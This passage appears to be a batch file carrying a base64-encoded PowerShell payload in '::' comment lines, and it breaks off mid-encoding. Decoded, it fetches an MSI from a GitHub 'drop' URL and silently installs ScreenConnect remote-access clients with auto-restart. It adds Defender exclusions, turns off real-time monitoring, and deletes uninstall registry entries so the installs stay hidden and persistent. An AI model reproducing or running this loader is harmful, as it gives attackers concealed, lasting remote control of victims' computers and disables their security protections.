::R3J5eGFGcCB7DQogICAgIyBMNDY6IEFOWSBub24tc2V2cnogUnVubmluZy9QZW5k
::aW5nIFNDIGlzIGxpdmUgLSBuZXZlciBpbnN0YWxsIG92ZXIgaXQuDQogICAgJGNm
::ZyA9IEdldC1Hcnl4YUZwDQogICAgaWYgKCRjZmcgLWFuZCAoVGVzdC1TY1J1bm5p
::bmcgJGNmZykgLWFuZCAoJGNmZyAtbm90aW4gJHNjcmlwdDpTZXZyektlZXApKSB7
::IHJldHVybiAkY2ZnLlRvTG93ZXIoKSB9DQogICAgaWYgKCRzY3JpcHQ6R3J5eGFF
::eHBlY3RlZEZwIC1hbmQgKFRlc3QtU2NSdW5uaW5nICRzY3JpcHQ6R3J5eGFFeHBl
::Y3RlZEZwKSkgeyByZXR1cm4gJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnAuVG9Mb3dl
::cigpIH0NCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAn
::U2NyZWVuQ29ubmVjdCBDbGllbnQqJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZSkpIHsNCiAgICAgICAgaWYgKCRzdmMuU3RhdHVzIC1ub3RpbiBAKCdSdW5u
::aW5nJywnU3RhcnRQZW5kaW5nJywnQ29udGludWVQZW5kaW5nJykpIHsgY29udGlu
::dWUgfQ0KICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17
::MTZ9KVwpJykgew0KICAgICAgICAgICAgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dl
::cigpDQogICAgICAgICAgICBpZiAoJGZwIC1pbiAkc2NyaXB0OlNldnJ6S2VlcCkg
::eyBjb250aW51ZSB9DQogICAgICAgICAgICByZXR1cm4gJGZwDQogICAgICAgIH0N
::CiAgICB9DQogICAgcmV0dXJuICRudWxsDQp9DQoNCmZ1bmN0aW9uIFRlc3QtQW55
::Tm9uU2V2cnpTY1J1bm5pbmcgeyByZXR1cm4gW2Jvb2xdKEZpbmQtUnVubmluZ0dy
::eXhhRnApIH0NCg0KZnVuY3Rpb24gR2V0LUdyeXhhU3RhdHVzKFtzdHJpbmddJGZw
::KSB7DQogICAgJGV4aXN0cyA9IFRlc3QtU2NTZXJ2aWNlRXhpc3RzICRmcA0KICAg
::ICRydW5uaW5nID0gVGVzdC1TY1J1bm5pbmcgJGZwDQogICAgJGRpciA9IFRlc3Qt
::U2NEaXIgJGZwDQogICAgJGd1aWQgPSBGaW5kLVByb2R1Y3RHdWlkICRmcA0KICAg
::ICR0Y3BSID0gJHRydWU7ICR0Y3BVID0gJHRydWUNCiAgICBpZiAoJERlZXAgLW9y
::IC1ub3QgJHJ1bm5pbmcpIHsNCiAgICAgICAgJHRjcFIgPSBUZXN0LVRjcEhvc3RQ
::b3J0ICRzY3JpcHQ6R3J5eGFSZWxheUhvc3QgNDQzDQogICAgICAgICR0Y3BVID0g
::VGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhVWlIb3N0IDQ0Mw0KICAgIH0N
::CiAgICBpZiAoJHJ1bm5pbmcpIHsgcmV0dXJuICJIRUFMVEhZfCRmcHxydW5uaW5n
::PTF8cmVsYXk9JHRjcFJ8dWk9JHRjcFUiIH0NCiAgICBpZiAoJGV4aXN0cyAtYW5k
::ICRkaXIpIHsgcmV0dXJuICJCUk9LRU58JGZwfHN2Yy1wcmVzZW50LXN0b3BwZWR8
::cmVsYXk9JHRjcFJ8dWk9JHRjcFUiIH0NCiAgICBpZiAoJGV4aXN0cykgeyByZXR1
::cm4gIkJST0tFTnwkZnB8c3ZjLXByZXNlbnQtc3RvcHBlZHxyZWxheT0kdGNwUnx1
::aT0kdGNwVSIgfQ0KICAgIGlmICgtbm90ICRleGlzdHMgLWFuZCAoJGRpciAtb3Ig
::JGd1aWQpKSB7IHJldHVybiAiU1RVQ0t8JGZwfHJlZ2lzdGVyZWQtbm8tc2Vydmlj
::ZXxyZWxheT0kdGNwUnx1aT0kdGNwVSIgfQ0KICAgIHJldHVybiAiQUJTRU5UfCRm
::cHxub3QtaW5zdGFsbGVkfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVIg0KfQ0KDQpmdW5j
::dGlvbiBUZXN0LUdyeXhhSGVhbHRoIHsNCiAgICAjIEw0NjogcHJlZmVyIGFueSBs
::aXZlIG5vbi1zZXZyeiBTQyBvdmVyIGNmZyBFeHBlY3RlZEZwICh3cm9uZyBGUCBp
::biBncnl4YS5jZmcgd2FzIGZhbHNlIERPV04pLg0KICAgICRsaXZlID0gRmluZC1S
::dW5uaW5nR3J5eGFGcA0KICAgIGlmICgkbGl2ZSkgew0KICAgICAgICBTZXQtR3J5
::eGFGcCAkbGl2ZQ0KICAgICAgICByZXR1cm4gKEdldC1Hcnl4YVN0YXR1cyAkbGl2
::ZSkNCiAgICB9DQogICAgcmV0dXJuIChHZXQtR3J5eGFTdGF0dXMgKEdldC1Hcnl4
::YUZwKSkNCn0NCg0KZnVuY3Rpb24gQ2xlYXItR3J5eGFBcnAoW3N0cmluZ10kZnAp
::IHsNCiAgICAkZ3VpZCA9IEZpbmQtUHJvZHVjdEd1aWQgJGZwDQogICAgZm9yZWFj
::aCAoJHIgaW4gQCgnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3Vy
::cmVudFZlcnNpb25cVW5pbnN0YWxsJywNCiAgICAgICAgICAgICAgICAgICAgICdI
::S0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJy
::ZW50VmVyc2lvblxVbmluc3RhbGwnKSkgew0KICAgICAgICBpZiAoJGd1aWQgLWFu
::ZCAoVGVzdC1QYXRoICIkclwkZ3VpZCIpKSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFs
::UGF0aCAiJHJcJGd1aWQiIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZSB9DQogICAgICAgIEdldC1DaGlsZEl0ZW0gJHIgLUVycm9y
::QWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAg
::ICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9y
::QWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lDQogICAgICAgICAg
::ICBpZiAoJGRuIC1tYXRjaCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgXCgkKFtyZWdl
::eF06OkVzY2FwZSgkZnApKVwpIikgew0KICAgICAgICAgICAgICAgIFJlbW92ZS1J
::dGVtIC1MaXRlcmFsUGF0aCAkXy5QU1BhdGggLVJlY3Vyc2UgLUZvcmNlIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICB9DQogICAgICAg
::IH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50
::KFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQogICAgaWYgKC1ub3QgJEZpbmdlcnBy
::aW50KSB7IHJldHVybiAnbm8tZnAnIH0NCiAgICAjIEw0NTogSEFORFMtT0ZGIOKA
::lCBuZXZlciB1bmluc3RhbGwvc3RvcC9kZWxldGUgQU5ZIFNjcmVlbkNvbm5lY3QN
::CiAgICByZXR1cm4gJ3JlZnVzZWQtaGFuZHMtb2ZmLXNjJw0KICAgIGlmIChUZXN0
::LVNjUnVubmluZyAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICdyZWZ1c2VkLXJ1bm5p
::bmcnIH0NCiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdl
::cnByaW50KSINCiAgICAkZ3VpZCA9IEZpbmQtUHJvZHVjdEd1aWQgJEZpbmdlcnBy
::aW50DQogICAgJiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2ll
::c1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL2Yg
::Mj4mMSB8IE91dC1OdWxsDQogICAgJiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZUV0FS
::RVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2Fi
::bGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgMj4mMSB8IE91dC1OdWxsDQogICAg
::aWYgKCRndWlkKSB7IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50
::TGlzdCAiL3ggJGd1aWQgL3FuIC9ub3Jlc3RhcnQgUkVCT09UPVJlYWxseVN1cHBy
::ZXNzIiAtV2FpdCAtV2luZG93U3R5bGUgSGlkZGVuOyBTdGFydC1TbGVlcCAtU2Vj
::b25kcyA2IH0NCiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICBpZiAoJHN2YykgeyAmIHNj
::LmV4ZSBzdG9wICRuYW1lIDI+JjEgfCBPdXQtTnVsbDsgJiBzYy5leGUgZGVsZXRl
::ICRuYW1lIDI+JjEgfCBPdXQtTnVsbDsgU3RhcnQtU2xlZXAgLVNlY29uZHMgMiB9
::DQogICAgQ2xlYXItR3J5eGFBcnAgJEZpbmdlcnByaW50DQogICAgZm9yZWFjaCAo
::JGJhc2UgaW4gQCgke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0sICRlbnY6UHJvZ3Jh
::bUZpbGVzKSkgew0KICAgICAgICAkZCA9IEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVu
::Q29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiDQogICAgICAgIGlmIChUZXN0
::LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7ICYgdGFrZW93bi5leGUgL0YgJGQgL1Ig
::L0QgWSAyPiYxIHwgT3V0LU51bGw7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAk
::ZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUg
::fQ0KICAgIH0NCiAgICByZXR1cm4gJ3JlbW92ZWQnDQp9DQoNCmZ1bmN0aW9uIFRl
::c3QtTXNpUGFja2FnZShbc3RyaW5nXSRQYXRoLCBbc3RyaW5nXSRFeHBlY3RlZEZw
::ID0gJycpIHsNCiAgICAjIFNoYXJlZCBPTEUtbWFnaWMgKyBvcHRpb25hbCBQcm9k
::dWN0TmFtZSBGUCBnYXRlIChMMzcvTDM5KS4gVXNlZCBieSBHcnl4YSArIHNldnJ6
::IGluc3RhbGwgcGF0aHMuDQogICAgaWYgKC1ub3QgJFBhdGggLW9yIC1ub3QgKFRl
::c3QtUGF0aCAtTGl0ZXJhbFBhdGggJFBhdGgpKSB7IHJldHVybiAkZmFsc2UgfQ0K
::ICAgIGlmICgoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICRQYXRoKS5MZW5ndGggLWx0
::IDUwMDAwMCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICB0cnkgew0KICAgICAgICAk
::ZnMgPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuUmVhZCgoUmVzb2x2ZS1QYXRoIC1M
::aXRlcmFsUGF0aCAkUGF0aCkuUGF0aCkNCiAgICAgICAgJG1hZ2ljID0gTmV3LU9i
::amVjdCBieXRlW10gNA0KICAgICAgICAkbnVsbCA9ICRmcy5SZWFkKCRtYWdpYywg
::MCwgNCkNCiAgICAgICAgJGZzLkNsb3NlKCkNCiAgICAgICAgaWYgKC1ub3QgKCRt
::YWdpY1swXSAtZXEgMHhEMCAtYW5kICRtYWdpY1sxXSAtZXEgMHhDRiAtYW5kICRt
::YWdpY1syXSAtZXEgMHgxMSAtYW5kICRtYWdpY1szXSAtZXEgMHhFMCkpIHsgcmV0
::dXJuICRmYWxzZSB9DQogICAgfSBjYXRjaCB7IHJldHVybiAkZmFsc2UgfQ0KICAg
::IGlmICgkRXhwZWN0ZWRGcCkgew0KICAgICAgICAkZnAgPSBHZXQtRnBGcm9tUHJv
::ZHVjdE5hbWUgKEdldC1Nc2lQcm9wZXJ0eSAkUGF0aCAnUHJvZHVjdE5hbWUnKQ0K
::ICAgICAgICBpZiAoLW5vdCAkZnAgLW9yICRmcCAtbmUgJEV4cGVjdGVkRnAuVG9M
::b3dlcigpKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIH0NCiAgICByZXR1cm4gJHRy
::dWUNCn0NCg0KZnVuY3Rpb24gR2V0LUdyeXhhTXNpIHsNCiAgICAkbXNpID0gSm9p
::bi1QYXRoICRXb3JrRGlyICdwa2dfZ3J5eGEubXNpJw0KICAgICMgV2hlbiBhbiBG
::UCBpcyBwaW5uZWQsIHRoZSBjYWNoZWQgTVNJIG11c3QgbWF0Y2ggaXQ7IG90aGVy
::d2lzZSByZWZldGNoLg0KICAgIGlmICgoVGVzdC1QYXRoICRtc2kpIC1hbmQgKChH
::ZXQtSXRlbSAkbXNpKS5MZW5ndGggLWd0IDEwMDAwMDApKSB7DQogICAgICAgIGlm
::ICgtbm90ICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSB7IHJldHVybiAkbXNpIH0N
::CiAgICAgICAgaWYgKFRlc3QtTXNpUGFja2FnZSAkbXNpICRzY3JpcHQ6R3J5eGFF
::eHBlY3RlZEZwKSB7IHJldHVybiAkbXNpIH0NCiAgICAgICAgUmVtb3ZlLUl0ZW0g
::LUxpdGVyYWxQYXRoICRtc2kgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlDQogICAgfQ0KICAgICR0bXAgPSBKb2luLVBhdGggJGVudjpURU1QICgi
::c2NfZ3J5eGFfezB9Lm1zaSIgLWYgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmco
::J04nKSkNCiAgICAjIEwzMTogZ2l0aHViLWRyb3AgRklSU1QgKHJhdyB3b3JrcyBl
::dmVuIHdoZW4gdWkuZ3J5eGEuY29tIFRMUyBpcyBicm9rZW4pLg0KICAgICR1cmxz
::ID0gQCgNCiAgICAgICAgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
::bS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3BrZ19ncnl4YS5tc2knLA0KICAg
::ICAgICAkc2NyaXB0OkdyeXhhTXNpVXJsDQogICAgKQ0KICAgICRjdXJsID0gSm9p
::bi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnU3lzdGVtMzJcY3VybC5leGUnDQogICAg
::aWYgKC1ub3QgKFRlc3QtUGF0aCAkY3VybCkpIHsgJGN1cmwgPSAnY3VybC5leGUn
::IH0NCiAgICBmb3JlYWNoICgkdSBpbiAkdXJscykgew0KICAgICAgICB0cnkgew0K
::ICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLUZvcmNl
::IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAmICRj
::dXJsIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1h
::eC10aW1lIDMwMCAtbyAkdG1wICR1IDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAg
::ICAgaWYgKChUZXN0LVBhdGggJHRtcCkgLWFuZCAoKEdldC1JdGVtICR0bXApLkxl
::bmd0aCAtZ3QgMTAwMDAwMCkpIHsNCiAgICAgICAgICAgICAgICAkZXhwID0gaWYg
::KCRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSB7ICRzY3JpcHQ6R3J5eGFFeHBlY3Rl
::ZEZwIH0gZWxzZSB7ICcnIH0NCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVz
::dC1Nc2lQYWNrYWdlICR0bXAgJGV4cCkpIHsgY29udGludWUgfQ0KICAgICAgICAg
::ICAgICAgIHRyeSB7IENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAtRGVzdGlu
::YXRpb24gJG1zaSAtRm9yY2UgLUVycm9yQWN0aW9uIFN0b3A7IHJldHVybiAkbXNp
::IH0gY2F0Y2ggeyByZXR1cm4gJHRtcCB9DQogICAgICAgICAgICB9DQogICAgICAg
::IH0gY2F0Y2gge30NCiAgICB9DQogICAgaWYgKFRlc3QtUGF0aCAkdG1wKSB7IFJl
::bW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1Gb3JjZSAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZSB9DQogICAgcmV0dXJuICRudWxsDQp9DQoNCmZ1bmN0
::aW9uIEFkZC1TY0RlZmVuZGVyRXhjbHVzaW9uKFtzdHJpbmddJEZwKSB7DQogICAg
::IyBFeGNsdWRlIHRoaXMgRlAncyBTQyBkaXJzICh3aWxkY2FyZCArIGV4cGxpY2l0
::KSBzbyBSVE0gY2FuJ3QgcXVhcmFudGluZSB0aGUNCiAgICAjIGNsaWVudCBvbiBp
::bnN0YWxsLiBSZS1hc3NlcnRlZCBiZWZvcmUgZXZlcnkgaW5zdGFsbC9taWdyYXRl
::IOKAlCBzdXJ2aXZlcyBGUCByb3RhdGlvbnMuDQogICAgdHJ5IHsNCiAgICAgICAg
::JG5hbWVzID0gQCgiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGcCkiLCAnU2NyZWVu
::Q29ubmVjdCBDbGllbnQqJykNCiAgICAgICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgk
::e2VudjpQcm9ncmFtRmlsZXMoeDg2KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkgew0K
::ICAgICAgICAgICAgaWYgKC1ub3QgJGJhc2UpIHsgY29udGludWUgfQ0KICAgICAg
::ICAgICAgZm9yZWFjaCAoJG4gaW4gJG5hbWVzKSB7IEFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvblBhdGggKEpvaW4tUGF0aCAkYmFzZSAkbikgLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUgfQ0KICAgICAgICB9DQogICAgICAgIEFkZC1NcFBy
::ZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJ1NjcmVlbkNvbm5lY3QuQ2xpZW50
::U2VydmljZS5leGUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
::ICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblByb2Nlc3MgJ1NjcmVlbkNv
::bm5lY3QuV2luZG93c0NsaWVudC5leGUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlDQogICAgICAgIFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGlt
::ZU1vbml0b3JpbmcgJHRydWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUN
::CiAgICB9IGNhdGNoIHt9DQp9DQoNCmZ1bmN0aW9uIENvbnZlcnRUby1QYWNrZWRH
::dWlkKFtzdHJpbmddJEd1aWQpIHsNCiAgICAjIFdpbmRvd3MgSW5zdGFsbGVyIHN0
::b3JlcyBQcm9kdWN0Q29kZXMgd2l0aCByZXZlcnNlZCBzZWdtZW50cyAocGFja2Vk
::L3NxdWlzaGVkIEdVSUQpLg0KICAgICRnID0gJEd1aWQuVHJpbSgne30nKS5SZXBs
::YWNlKCctJywgJycpDQogICAgJHNiID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5T
::dHJpbmdCdWlsZGVyDQogICAgIyBmaXJzdCAzIHNlZ21lbnRzIHJldmVyc2VkIHBl
::ci1jaGFyLCBsYXN0IDIgc2VnbWVudHMgcmV2ZXJzZWQgcGVyLWJ5dGUtcGFpcg0K
::ICAgICRzZWdzID0gQCgkZy5TdWJzdHJpbmcoMCw4KSwgJGcuU3Vic3RyaW5nKDgs
::NCksICRnLlN1YnN0cmluZygxMiw0KSwgJGcuU3Vic3RyaW5nKDE2LDQpLCAkZy5T
::dWJzdHJpbmcoMjAsMTIpKQ0KICAgIGZvciAoJGk9MDsgJGkgLWx0IDM7ICRpKysp
::IHsgJGMgPSAkc2Vnc1skaV0uVG9DaGFyQXJyYXkoKTsgW2FycmF5XTo6UmV2ZXJz
::ZSgkYyk7IFt2b2lkXSRzYi5BcHBlbmQoLWpvaW4gJGMpIH0NCiAgICBmb3IgKCRp
::PTM7ICRpIC1sdCA1OyAkaSsrKSB7ICRzID0gJHNlZ3NbJGldOyBmb3IgKCRqPTA7
::ICRqIC1sdCAkcy5MZW5ndGg7ICRqKz0yKSB7IFt2b2lkXSRzYi5BcHBlbmQoJHNb
::JGorMV0pOyBbdm9pZF0kc2IuQXBwZW5kKCRzWyRqXSkgfSB9DQogICAgcmV0dXJu
::ICRzYi5Ub1N0cmluZygpLlRvVXBwZXIoKQ0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUt
::SW5zdGFsbGVyUHJvZHVjdFJlZ2lzdHJhdGlvbihbc3RyaW5nXSRQcm9kdWN0Q29k
::ZSkgew0KICAgICMgUHVyZ2UgYSBwaGFudG9tL2NvcnJ1cHQgUHJvZHVjdENvZGUg
::ZnJvbSB0aGUgSW5zdGFsbGVyIGRhdGFiYXNlIChJbnN0YWxsZWQ9MDA6MDA6MDAN
::CiAgICAjIHJlZ2lzdHJhdGlvbnMgdGhhdCBzdXJ2aXZlIEFSUCByZW1vdmFsIGFu
::ZCBtYWtlIC9pIGZhaWwgMTYwMyBpbiBtYWludGVuYW5jZSBtb2RlKS4NCiAgICBp
::ZiAoLW5vdCAkUHJvZHVjdENvZGUpIHsgcmV0dXJuIH0NCiAgICAkcGFja2VkID0g
::Q29udmVydFRvLVBhY2tlZEd1aWQgJFByb2R1Y3RDb2RlDQogICAgJGtleXMgPSBA
::KA0KICAgICAgICAiSEtMTTpcU09GVFdBUkVcQ2xhc3Nlc1xJbnN0YWxsZXJcUHJv
::ZHVjdHNcJHBhY2tlZCIsDQogICAgICAgICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnN0YWxsZXJcVXNlckRhdGFcUy0x
::LTUtMThcUHJvZHVjdHNcJHBhY2tlZCIsDQogICAgICAgICJIS0xNOlxTT0ZUV0FS
::RVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcJFBy
::b2R1Y3RDb2RlIiwNCiAgICAgICAgIkhLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2Rl
::XE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwkUHJv
::ZHVjdENvZGUiDQogICAgKQ0KICAgIGZvcmVhY2ggKCRrIGluICRrZXlzKSB7DQog
::ICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRrKSB7IFJlbW92ZS1J
::dGVtIC1MaXRlcmFsUGF0aCAkayAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUgfQ0KICAgIH0NCiAgICAmIHJlZy5leGUgZGVsZXRl
::ICJIS0NSXEluc3RhbGxlclxQcm9kdWN0c1wkcGFja2VkIiAvZiAyPiYxIHwgT3V0
::LU51bGwNCn0NCg0KZnVuY3Rpb24gU3RhcnQtR3J5eGFJbnN0YWxsKFtzdHJpbmdd
::JE1zaVBhdGgsIFtzdHJpbmddJEZwLCBbc3RyaW5nXSRMb2dGaWxlKSB7DQogICAg
::IyBMNDQ6IG5ldmVyIGludGVycnVwdCBhbnkgbGl2ZSBHcnl4YTsgbmV2ZXIgL2kg
::d2hpbGUgdGhpcyBGUCdzIHNlcnZpY2UgZXhpc3RzOyBuZXZlciBkZWZlcnJlZCAv
::eC4NCiAgICBpZiAoRmluZC1SdW5uaW5nR3J5eGFGcCkgeyByZXR1cm4gfQ0KICAg
::IGlmICgkRnAgLWFuZCAoVGVzdC1TY1J1bm5pbmcgJEZwKSkgeyByZXR1cm4gfQ0K
::ICAgIGlmICgkRnAgLWFuZCAoVGVzdC1TY1NlcnZpY2VFeGlzdHMgJEZwKSkgew0K
::ICAgICAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZwKSINCiAg
::ICAgICAgJiBzYy5leGUgY29uZmlnICRuYW1lIHN0YXJ0PSBhdXRvIDI+JjEgfCBP
::dXQtTnVsbA0KICAgICAgICAmIHNjLmV4ZSBzdGFydCAkbmFtZSAyPiYxIHwgT3V0
::LU51bGwNCiAgICAgICAgcmV0dXJuDQogICAgfQ0KICAgIEFkZC1TY0RlZmVuZGVy
::RXhjbHVzaW9uICRGcA0KICAgICRzYWZlTXNpID0gUHJvdGVjdC1Nc2lTaWJsaW5n
::U2FmZSAkTXNpUGF0aA0KICAgIGlmICgtbm90ICRzYWZlTXNpKSB7IHJldHVybiB9
::ICAjIHJlZnVzZSBpbnN0YWxsIGlmIFVwZ3JhZGUgY2Fubm90IGJlIGNsZWFyZWQN
::CiAgICAkcGMgPSBHZXQtTXNpUHJvcGVydHkgJHNhZmVNc2kgJ1Byb2R1Y3RDb2Rl
::Jw0KICAgICRjbWQgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhX2luc3RhbGwu
::Y21kJw0KICAgICRzdmNOYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRnAp
::Ig0KICAgICRsaW5lcyA9IEAoJ0BlY2hvIG9mZicpDQogICAgJGxpbmVzICs9ICdy
::ZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dz
::XEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+
::bnVsIDI+JjEnDQogICAgIyBMNDQgcnVudGltZSBndWFyZCBpbiBkZWZlcnJlZCBj
::bWQg4oCUIGFib3J0IGlmIEdyeXhhIGFwcGVhcmVkIHNpbmNlIHdyYXBwZXIgd2Fz
::IHdyaXR0ZW4NCiAgICAkbGluZXMgKz0gInNjIHF1ZXJ5IGAiJHN2Y05hbWVgIiA+
::bnVsIDI+JjEiDQogICAgJGxpbmVzICs9ICdpZiBub3QgZXJyb3JsZXZlbCAxIChz
::YyBzdGFydCAiJyArICRzdmNOYW1lICsgJyIgPm51bCAyPiYxICYgZXhpdCAvYiAw
::KScNCiAgICAkbGluZXMgKz0gJ3NjIHF1ZXJ5IHN0YXRlPSBhbGwgfCBmaW5kc3Ry
::IC9JIC9DOiInICsgJEZwICsgJyIgPm51bCcNCiAgICAkbGluZXMgKz0gJ2lmIG5v
::dCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwJw0KICAgICMgbm8gbXNpZXhlYyAveCBl
::dmVyIGluIGRlZmVycmVkIHdyYXBwZXIgKFRPQ1RPVSBraWxsZWQgbGl2ZSBHdWVz
::dCkNCiAgICBpZiAoJHBjKSB7DQogICAgICAgICRsaW5lcyArPSAicmVnIGRlbGV0
::ZSBgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNp
::b25cVW5pbnN0YWxsXCRwY2AiIC9mID5udWwgMj4mMSINCiAgICAgICAgJGxpbmVz
::ICs9ICJyZWcgZGVsZXRlIGAiSEtMTVxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNy
::b3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcJHBjYCIgL2Yg
::Pm51bCAyPiYxIg0KICAgIH0NCiAgICAkbGluZXMgKz0gIm1zaWV4ZWMgL2kgYCIk
::c2FmZU1zaWAiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxs
::eVN1cHByZXNzIC9MKnYgYCIkTG9nRmlsZWAiIg0KICAgICRsaW5lcyArPSAic2Mg
::Y29uZmlnIGAiJHN2Y05hbWVgIiBzdGFydD0gYXV0byINCiAgICAkbGluZXMgKz0g
::InNjIGZhaWx1cmUgYCIkc3ZjTmFtZWAiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSBy
::ZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMCINCiAgICAkbGlu
::ZXMgKz0gInNjIHN0YXJ0IGAiJHN2Y05hbWVgIiINCiAgICBmb3JlYWNoICgkc2sg
::aW4gKEdldC1TZXZyektlZXApKSB7DQogICAgICAgICRsaW5lcyArPSAic2MgY29u
::ZmlnIGAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRzaylgIiBzdGFydD0gYXV0byA+
::bnVsIDI+JjEiDQogICAgICAgICRsaW5lcyArPSAic2Mgc3RhcnQgYCJTY3JlZW5D
::b25uZWN0IENsaWVudCAoJHNrKWAiID5udWwgMj4mMSINCiAgICB9DQogICAgJHJl
::c3VsdEZpbGUgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhX2luc3RhbGwucmVz
::dWx0Jw0KICAgICRsaW5lcyArPSAiZWNobyAlRVJST1JMRVZFTCU+YCIkcmVzdWx0
::RmlsZWAiIg0KICAgICRsaW5lcyArPSAiZGVsIC9mIC9xIGAiJHNhZmVNc2lgIiA+
::bnVsIDI+JjEiDQogICAgJGxpbmVzICs9ICJkZWwgL2YgL3EgYCIkY21kYCIgPm51
